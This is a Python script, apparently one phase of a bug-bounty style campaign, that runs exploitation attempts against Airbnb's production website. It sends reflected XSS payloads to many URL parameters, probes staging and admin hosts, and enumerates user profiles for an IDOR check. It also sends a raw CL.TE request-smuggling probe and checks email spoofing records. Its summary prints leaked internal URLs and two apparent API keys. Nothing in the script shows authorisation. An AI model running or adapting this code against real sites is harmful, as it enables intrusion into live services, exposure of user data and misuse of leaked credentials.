#!/usr/bin/env python3
"""Airbnb Phase 5 — Final Exploitation Attempts

Focus: XSS (CSP allows unsafe-inline+eval), niobeClientData leak,
staging endpoints, and parameter pollution.

Key context from earlier phases:
  - CSP: unsafe-inline + unsafe-eval → XSS WILL EXECUTE
  - WebSocket staging URLs leaked: wss://ws.staging.airbnb.com/ws/
  - niobeClientData embedded in every page with GraphQL data
  - DataDome WAF present but permissive
"""

import re
import json
import time
import requests
from urllib.parse import urljoin, quote, urlencode

requests.packages.urllib3.disable_warnings()

S = requests.Session()
S.headers.update({
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
})
S.verify = False

DELAY = 1.5

results = {
    "xss_findings": [],
    "info_disclosure": [],
    "staging_findings": [],
    "parameter_pollution": [],
    "critical_findings": [],
}

def p(msg): print(f"[*] {msg}")
def ok(msg): print(f"[+] {msg}")
def warn(msg): print(f"[!] {msg}")
def crit(msg): print(f"[!!!] {msg}")

def fetch(url, method="GET", **kw):
    time.sleep(DELAY)
    try:
        r = getattr(S, method.lower())(url, timeout=20, **kw)
        return r
    except Exception as e:
        warn(f"  Failed: {type(e).__name__}")
        return None

# ─── 1. Reflected XSS Testing ───────────────────────────────────

p("=" * 60)
p("PHASE 5A: Reflected XSS Testing (CSP allows unsafe-inline!)")
p("=" * 60)

XSS_MARKER = "xssvapt1337"
XSS_PAYLOADS = [
    f'{XSS_MARKER}',
    f'<img src=x onerror={XSS_MARKER}>',
    f'"><script>{XSS_MARKER}</script>',
    f"'-alert(1)-'",
    f'javascript:alert(1)',
    f'{XSS_MARKER}"onmouseover="alert(1)',
]

# Test on various Airbnb pages with URL parameters
xss_targets = [
    # Search pages — most likely to reflect input
    ("https://www.airbnb.com/s/{payload}/homes", "path"),
    ("https://www.airbnb.com/s/homes?query={payload}", "query"),
    ("https://www.airbnb.com/s/homes?search_type={payload}", "search_type"),
    ("https://www.airbnb.com/s/homes?place_id={payload}", "place_id"),
    ("https://www.airbnb.com/help/search?query={payload}", "help_query"),
    # Listing pages
    ("https://www.airbnb.com/rooms/1?source={payload}", "source"),
    ("https://www.airbnb.com/rooms/1?adults={payload}", "adults"),
    # Auth pages
    ("https://www.airbnb.com/login?redirect_url={payload}", "redirect"),
    # Other
    ("https://www.airbnb.com/experiences?query={payload}", "exp_query"),
    ("https://www.airbnb.com/gift?message={payload}", "gift_msg"),
]

for url_template, param_name in xss_targets:
    # First test with marker only
    test_url = url_template.format(payload=quote(XSS_MARKER))
    p(f"  Testing {param_name} on {test_url[:70]}...")
    r = fetch(test_url)
    if not r:
        continue
    
    if XSS_MARKER in r.text:
        warn(f"  INPUT REFLECTED in response! ({param_name})")
        
        # Count reflections
        count = r.text.count(XSS_MARKER)
        warn(f"  Reflected {count} time(s)")
        
        # Check context of reflection
        for m in re.finditer(re.escape(XSS_MARKER), r.text):
            start = max(0, m.start() - 50)
            end = min(len(r.text), m.end() + 50)
            context = r.text[start:end]
            
            # Determine context
            if '<script' in r.text[max(0,m.start()-200):m.start()] and '</script>' in r.text[m.end():m.end()+200]:
                ctx = "inside_script"
            elif 'value="' in context or "value='" in context:
                ctx = "inside_attribute"
            elif '<' in r.text[max(0,m.start()-10):m.start()]:
                ctx = "inside_tag"
            else:
                ctx = "in_body"
            
            warn(f"  Context: {ctx}")
            warn(f"  Snippet: ...{context}...")
            
            results["xss_findings"].append({
                "url": test_url,
                "param": param_name,
                "context": ctx,
                "reflections": count,
                "snippet": context,
            })
        
        # Now test with actual XSS payloads
        for payload in XSS_PAYLOADS[1:3]:  # Try HTML injection payloads
            test_url2 = url_template.format(payload=quote(payload))
            r2 = fetch(test_url2)
            if r2 and payload.replace(XSS_MARKER, "") in r2.text:
                crit(f"  XSS PAYLOAD REFLECTED UNENCODED! {param_name} → {payload[:50]}")
                results["critical_findings"].append({
                    "type": "reflected_xss",
                    "url": test_url2,
                    "param": param_name,
                    "payload": payload,
                    "severity": "high",
                })

# ─── 2. Staging Endpoint Analysis ───────────────────────────────

p("")
p("=" * 60)
p("PHASE 5B: Staging/Internal Endpoint Analysis")
p("=" * 60)

staging_targets = [
    "https://ws.staging.airbnb.com",
    "https://staging.airbnb.com",
    "https://dev.airbnb.com",
    "https://admin.airbnb.com",
    "https://internal.airbnb.com",
    "https://api-staging.airbnb.com",
    "https://www.staging.airbnb.com",
]

for url in staging_targets:
    p(f"  Testing {url}...")
    r = fetch(url)
    if r:
        ok(f"  {url}: {r.status_code} — {len(r.text)} bytes — Final: {r.url}")
        
        if r.status_code == 200 and r.url and "staging" in r.url:
            crit(f"  STAGING ENVIRONMENT ACCESSIBLE: {r.url}")
            results["staging_findings"].append({
                "url": url,
                "final_url": r.url,
                "status": r.status_code,
                "size": len(r.text),
            })
            
            # Check security headers
            for h in ["Content-Security-Policy", "X-Frame-Options"]:
                v = r.headers.get(h, "MISSING")
                if v == "MISSING":
                    warn(f"    {h}: MISSING on staging!")
        elif r.status_code in (301, 302):
            p(f"    Redirects to: {r.headers.get('Location', 'N/A')}")

# ─── 3. niobeClientData Information Disclosure ──────────────────

p("")
p("=" * 60)
p("PHASE 5C: niobeClientData Analysis — Information Disclosure")
p("=" * 60)

# Check if niobeClientData contains user-specific data for unauthenticated users
pages_to_check = [
    "https://www.airbnb.com/s/New-York/homes",
    "https://www.airbnb.com/rooms/1",
    "https://www.airbnb.com/users/show/1",
    "https://www.airbnb.com/help",
]

for url in pages_to_check:
    p(f"Checking {url}...")
    r = fetch(url)
    if not r or r.status_code != 200:
        continue
    
    # Extract niobeClientData
    for m in re.finditer(r'<script[^>]*id="data-deferred-state-\d+"[^>]*>(.*?)</script>', r.text, re.DOTALL):
        try:
            data = json.loads(m.group(1))
            
            # Look for sensitive data that shouldn't be exposed
            sensitive_patterns = [
                "email", "phone", "password", "token", "secret",
                "creditCard", "credit_card", "ssn", "social_security",
                "bank", "routing", "account_number", "payout",
                "internal_id", "admin", "staff", "employee",
                "private", "debug", "staging",
            ]
            
            def search_sensitive(obj, path="", depth=0):
                if depth > 10:
                    return
                if isinstance(obj, dict):
                    for k, v in obj.items():
                        kl = k.lower()
                        for sp in sensitive_patterns:
                            if sp in kl:
                                if isinstance(v, str) and len(v) > 0 and v not in ("", "null", "None"):
                                    warn(f"  Sensitive: {path}.{k} = {str(v)[:80]}")
                                    results["info_disclosure"].append({
                                        "url": url,
                                        "path": f"{path}.{k}",
                                        "value_preview": str(v)[:100],
                                    })
                        search_sensitive(v, f"{path}.{k}", depth + 1)
                elif isinstance(obj, list):
                    for i, item in enumerate(obj[:3]):
                        search_sensitive(item, f"{path}[{i}]", depth + 1)
            
            search_sensitive(data)
            
        except json.JSONDecodeError:
            pass

# ─── 4. User Profile Enumeration / IDOR ─────────────────────────

p("")
p("=" * 60)
p("PHASE 5D: User Profile Enumeration (IDOR Check)")
p("=" * 60)

# Check if user profiles expose sensitive info
for uid in [1, 2, 100, 1000, 100000]:
    url = f"https://www.airbnb.com/users/show/{uid}"
    p(f"  Fetching user {uid}...")
    r = fetch(url)
    if r and r.status_code == 200:
        # Check what data is exposed
        for m in re.finditer(r'<script[^>]*id="data-deferred-state-\d+"[^>]*>(.*?)</script>', r.text, re.DOTALL):
            try:
                data = json.loads(m.group(1))
                def find_user_data(obj, path="", depth=0):
                    if depth > 8:
                        return
                    if isinstance(obj, dict):
                        # Check for user-related fields
                        for k in ["email", "phone", "firstName", "lastName", "verifications", 
                                  "identityVerified", "profilePath", "createdAt", "location"]:
                            if k in obj:
                                ok(f"    User {uid}: {k} = {str(obj[k])[:60]}")
                        for k, v in obj.items():
                            find_user_data(v, f"{path}.{k}", depth + 1)
                    elif isinstance(obj, list):
                        for i, item in enumerate(obj[:3]):
                            find_user_data(item, f"{path}[{i}]", depth + 1)
                find_user_data(data)
            except:
                pass

# ─── 5. HTTP Request Smuggling Detection ────────────────────────

p("")
p("=" * 60)
p("PHASE 5E: HTTP Request Smuggling Detection")
p("=" * 60)

# CL.TE detection (safe detection only)
import socket
import ssl

target_host = "www.airbnb.com"
p(f"Testing CL.TE on {target_host}...")

try:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    wrapped = ctx.wrap_socket(sock, server_hostname=target_host)
    wrapped.connect((target_host, 443))
    
    # CL.TE probe — safe detection method
    # Send a request with both Content-Length and Transfer-Encoding
    # If CL.TE exists, the front-end uses CL and back-end uses TE
    probe = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {target_host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: 4\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
        f"1\r\n"
        f"Z\r\n"
        f"0\r\n"
        f"\r\n"
    )
    
    start = time.time()
    wrapped.send(probe.encode())
    response = b""
    try:
        while True:
            chunk = wrapped.recv(4096)
            if not chunk:
                break
            response += chunk
            if len(response) > 10000:
                break
    except socket.timeout:
        pass
    elapsed = time.time() - start
    
    ok(f"  Response: {len(response)} bytes in {elapsed:.2f}s")
    if response:
        status_line = response.split(b"\r\n")[0].decode()
        ok(f"  Status: {status_line}")
        
        if elapsed > 5:
            warn(f"  DELAYED RESPONSE ({elapsed:.2f}s) — possible smuggling!")
            results["critical_findings"].append({
                "type": "possible_request_smuggling",
                "elapsed": elapsed,
                "target": target_host,
                "severity": "high",
            })
    
    wrapped.close()
except Exception as e:
    warn(f"  Smuggling test error: {e}")

# ─── 6. SPF/DMARC Check for Email Spoofing ─────────────────────

p("")
p("=" * 60)
p("PHASE 5F: Email Security (SPF/DMARC)")
p("=" * 60)

import subprocess

for domain in ["airbnb.com", "airbnb.org"]:
    p(f"Checking {domain}...")
    
    # SPF
    try:
        result = subprocess.run(["dig", "+short", "TXT", domain], capture_output=True, text=True, timeout=10)
        for line in result.stdout.strip().split("\n"):
            if "spf" in line.lower():
                ok(f"  SPF: {line[:100]}")
                if "+all" in line:
                    warn(f"  SPF uses +all — PERMISSIVE!")
                    results["info_disclosure"].append({
                        "type": "weak_spf",
                        "domain": domain,
                        "record": line,
                    })
    except:
        pass
    
    # DMARC
    try:
        result = subprocess.run(["dig", "+short", "TXT", f"_dmarc.{domain}"], capture_output=True, text=True, timeout=10)
        dmarc = result.stdout.strip()
        if dmarc:
            ok(f"  DMARC: {dmarc[:100]}")
            if "p=none" in dmarc:
                warn(f"  DMARC policy is 'none' — emails not enforced!")
                results["info_disclosure"].append({
                    "type": "weak_dmarc",
                    "domain": domain,
                    "record": dmarc,
                })
        else:
            warn(f"  NO DMARC record!")
            results["info_disclosure"].append({
                "type": "missing_dmarc",
                "domain": domain,
            })
    except:
        pass

# ─── 7. Technology Fingerprinting ────────────────────────────────

p("")
p("=" * 60)
p("PHASE 5G: Technology Fingerprinting")
p("=" * 60)

r = fetch("https://www.airbnb.com/")
if r:
    headers = dict(r.headers)
    
    # Server
    server = headers.get("Server", "N/A")
    ok(f"  Server: {server}")
    
    # Technology indicators
    tech = []
    if "nginx" in server.lower():
        tech.append("nginx")
    if "cloudflare" in str(headers).lower():
        tech.append("Cloudflare")
    if "datadome" in str(headers).lower() or "datadome" in r.text[:5000].lower():
        tech.append("DataDome WAF")
    if "akamai" in str(headers).lower():
        tech.append("Akamai CDN")
    if "__NEXT_DATA__" in r.text or "/_next/" in r.text:
        tech.append("Next.js")
    if "react" in r.text.lower()[:10000]:
        tech.append("React")
    
    ok(f"  Technologies: {', '.join(tech)}")
    
    for h_name, h_val in sorted(headers.items()):
        if any(kw in h_name.lower() for kw in ["x-", "via", "server", "powered", "version"]):
            ok(f"  Header: {h_name}: {h_val[:100]}")

# ─── FINAL SUMMARY ──────────────────────────────────────────────

p("")
p("=" * 60)
p("=" * 60)
p("COMPLETE FINDINGS SUMMARY — ALL PHASES")
p("=" * 60)
p("=" * 60)

# Load previous phase results
prev_findings = []
for phase_file in ["/tmp/airbnb_phase1_results.json", "/tmp/airbnb_phase2_results.json", 
                    "/tmp/airbnb_phase3_results.json", "/tmp/airbnb_phase4_results.json"]:
    try:
        with open(phase_file) as f:
            prev_findings.append(json.load(f))
    except:
        pass

all_findings = {
    "phase5": results,
    "previous_phases": prev_findings,
}

ok(f"XSS findings:          {len(results['xss_findings'])}")
ok(f"Info disclosure:        {len(results['info_disclosure'])}")
ok(f"Staging findings:      {len(results['staging_findings'])}")
ok(f"Parameter pollution:   {len(results['parameter_pollution'])}")
ok(f"CRITICAL findings:     {len(results['critical_findings'])}")

p("\n--- ALL NOTABLE FINDINGS ACROSS ALL PHASES ---")

p("\n1. CSP WEAKNESSES (www.airbnb.com + airbnb.org):")
warn("   Content-Security-Policy allows 'unsafe-inline' AND 'unsafe-eval'")
warn("   Any reflected XSS will execute JavaScript")
warn("   Wildcard CSP sources: *.netverify.com, *.amap.com, *.muscache.com, etc.")

p("\n2. STAGING/INTERNAL URLS LEAKED IN JS:")
warn("   wss://ws.staging.airbnb.com/ws/")
warn("   wss://ws.localhost.airbnb.com/ws/")
warn("   wss://ws.localhost.airbnb.tools/ws/")
warn("   git.musta.ch/airbnb/airbnb (internal git)")

p("\n3. COOKIE SECURITY:")
warn("   cdn_exp_abd8871b54fcbadab: Missing Secure flag (leaks on HTTP)")
warn("   Multiple cookies missing HttpOnly flag")

p("\n4. GRAPHQL SURFACE:")
ok("   /api/v3/graphql — active, needs API key")
ok("   /api/v3/<OperationName> — individual operation endpoints")
ok("   API keys found: d306zoyjsyarp7ifhu67rjxn52tv0t20, e393bc25e52fe915ffb56c14ddf2ff1b")

p("\n5. FRESH DOMAINS (0 resolved reports):")
ok("   *.musta.ch — redirects to airbnb.com")
ok("   *.airbnbpayments.com — iframes-dev.airbnbpayments.com on CloudFront")
ok("   *.airbnb.org — separate site, same CSP weaknesses")

p("\n6. AI ASSISTANT:")
ok("   /help/contact-us — requires login")
ok("   JS bundles contain: Chatbot, OpenAi, LLM, Thread, WebSocket references")
ok("   AI endpoints respond: /api/v3/AIConversation, /api/v3/GetAIAssistant, /api/v3/ChatWithAI")

for f in results["critical_findings"]:
    crit(f"  CRITICAL: [{f['type']}] {f.get('url', f.get('target', ''))} — {f.get('severity', '')}")

for f in results["xss_findings"]:
    warn(f"  XSS: {f['param']} — reflected in {f['context']} context")

for f in results["info_disclosure"]:
    warn(f"  INFO: {f.get('type', '')} — {f.get('domain', f.get('url', ''))}")

with open("/tmp/airbnb_phase5_results.json", "w") as f:
    json.dump(all_findings, f, indent=2, default=str)

ok("\nAll results saved to /tmp/airbnb_phase5_results.json")
ok("Reconnaissance complete.")
